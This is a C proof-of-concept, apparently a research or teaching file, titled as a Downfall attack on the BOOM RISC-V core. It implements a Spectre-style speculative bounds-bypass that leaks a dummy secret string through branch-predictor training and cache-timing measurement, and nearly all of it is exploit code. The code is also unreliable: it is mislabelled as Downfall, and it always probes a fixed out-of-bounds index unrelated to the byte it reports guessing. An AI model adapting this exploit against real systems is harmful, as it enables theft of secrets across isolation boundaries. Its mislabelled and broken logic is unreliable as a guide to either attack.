#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_ROUNDS 100
#define SECRET_LENGTH 26
#define CACHE_HIT_THRESHOLD 40

uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretData = "!\"#ThisIsTheSecretString:)";
volatile uint8_t temp = 0;

/**
 * La funzione vittima: se speculativamente il branch predictor sbaglia,
 * per un attimo potrebbe eseguire l'accesso a secretData[x] anche se x >= SECRET_LENGTH.
 */
static inline void victimFunctionScalar(size_t x) {
    // branch condizionale
    if (x < SECRET_LENGTH) {
        // Accesso speculativo
        temp &= array2[(secretData[x] * L1_BLOCK_SZ_BYTES)];
    }
}

int main(void) {
    static int results[256];
    uint8_t dummy = 0;

    // Inizializza array2 per evitare problemi di allineamento
    for (int i = 0; i < 256; i++) {
        array2[i * L1_BLOCK_SZ_BYTES] = 1;
    }

    printf("Inizio dell'attacco Downfall PoC su BOOM RISC-V...\n");

    for (int target_offset = 0; target_offset < SECRET_LENGTH; target_offset++) {
        for (int j = 0; j < 256; j++) {
            results[j] = 0;
        }

        for (int round = 0; round < NUM_ROUNDS; round++) {
            // Flush dell'array2 prima di ogni tentativo
            flushCache((uint64_t)array2, sizeof(array2));

            // Allenamento branch predictor: chiamate multiple con indici validi
            for (int train = 0; train < 30; train++) {
                size_t training_index = train % SECRET_LENGTH;
                victimFunctionScalar(training_index);
            }

            // Ora chiamiamo con un indice fuori dai limiti per provocare speculazione
            size_t malicious_index = SECRET_LENGTH + 5; 
            victimFunctionScalar(malicious_index);

            // Misuriamo il tempo di accesso per ogni linea di array2
            for (int k = 0; k < 256; k++) {
                uint64_t start = rdcycle();
                dummy &= array2[k * L1_BLOCK_SZ_BYTES];
                uint64_t elapsed = rdcycle() - start;

                if (elapsed < CACHE_HIT_THRESHOLD) {
                    results[k]++;
                }
            }
        }

        // Trova il valore con il maggior numero di cache hits
        int max = -1;
        int max_idx = -1;
        for (int j = 0; j < 256; j++) {
            if (results[j] > max) {
                max = results[j];
                max_idx = j;
            }
        }

        char guessed_char = (char)max_idx;
        if (max <= 0) {
            guessed_char = '?'; // Se non abbiamo hits, mettiamo un placeholder
        }

        printf("Byte %d: expected '%c', guessed '%c' (hits: %d)\n",
               target_offset, secretData[target_offset], guessed_char, max);
    }

    return 0;
}

